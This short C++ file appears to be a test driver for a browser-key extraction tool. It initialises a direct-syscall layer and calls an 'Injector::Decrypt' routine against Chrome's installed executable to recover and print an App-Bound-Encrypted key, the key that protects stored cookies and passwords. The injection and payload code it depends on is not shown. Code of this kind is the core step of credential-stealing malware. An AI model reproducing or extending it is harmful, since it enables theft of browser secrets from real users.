#include "../../src/injector/injector_api.hpp"
#include "../../src/payload/messages.hpp"
#include "../../src/sys/internal_api.hpp"
#include <iostream>

int wmain(int argc, wchar_t* argv[]) {


    if (!Sys::InitApi(true)) {
        std::wcerr << L"Syscall initialization failed" << std::endl;
        return 1;
    }

    bool verbose = true;
    int ret = 0;
    char* app_bound_encrypted_key="";
    std::cout << "App Bound Encrypted Key: " << app_bound_encrypted_key << std::endl;
    char buffer[256];
    memset(buffer, 0, sizeof(buffer));
    uint32_t outEncryptedKeyLength = 0;
    ret = Injector::Decrypt(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        app_bound_encrypted_key, static_cast<uint32_t>(std::strlen(app_bound_encrypted_key)), buffer, outEncryptedKeyLength);
    std::cout << "Decrypt returned: " << ret << std::endl;
    std::cout << "Output key length: " << outEncryptedKeyLength << std::endl;
    std::cout << "Output key: " << buffer << std::endl;

    return ret;
}